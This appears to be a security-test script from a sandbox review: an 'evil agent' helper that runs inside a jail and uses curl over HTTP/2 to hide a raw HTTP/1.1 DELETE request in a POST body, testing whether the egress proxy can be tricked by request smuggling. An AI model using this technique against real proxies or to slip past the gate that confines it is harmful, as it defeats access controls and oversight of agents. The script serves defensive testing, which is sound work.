"""Evil agent: HTTP/2-to-HTTP/1.1 request smuggling (security review of T11). The agent sends an
HTTP/2 POST whose body is itself a second, raw HTTP/1.1 request (a DELETE the gate never saw).
Over HTTP/2 the body goes in DATA frames with no Content-Length; a proxy that forwards it to an
HTTP/1.1 server without adding framing would make the server read a zero-length body and the
smuggled request behind it.

Runs INSIDE the jail, as the agent's user (python3 -c). Uses curl, the only HTTP/2 client in the
jail. Usage: ``<script> <host> <cover path> <smuggled raw request> <timeout>``. Prints one JSON
object on its last line: the cover request's status (or none), and whether curl reported HTTP/2.
"""

import json
import subprocess
import sys

host, cover_path, smuggled, timeout = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]


def main() -> dict:
    # The jail's HTTPS_PROXY points at the proxy and the proxy's CA is trusted system-wide, as
    # test_local_provider.py relies on: --http2 negotiates HTTP/2 with the proxy inside the
    # tunnel (the server itself only offers http/1.1).
    argv = [
        "curl", "-sS", "--http2", "--max-time", timeout,
        "-X", "POST",
        "-H", "Transfer-Encoding: chunked",  # over h2, curl streams with no Content-Length
        "-H", "Content-Type: application/octet-stream",
        "--data-binary", smuggled,
        "-o", "/dev/null", "-w", "%{http_code} %{http_version}",
        f"https://{host}{cover_path}",
    ]  # fmt: skip
    try:
        done = subprocess.run(argv, capture_output=True, text=True, timeout=float(timeout) + 5)
    except subprocess.TimeoutExpired:
        return {"status": None, "http_version": None, "timed_out": True}
    out = (done.stdout or "").strip().split()
    code = out[0] if out else ""
    version = out[1] if len(out) > 1 else ""
    return {
        "status": int(code) if code.isdigit() and code != "000" else None,
        "http_version": version or None,
        "curl_rc": done.returncode,
        "stderr": (done.stderr or "")[-200:],
    }


print(json.dumps(main()))
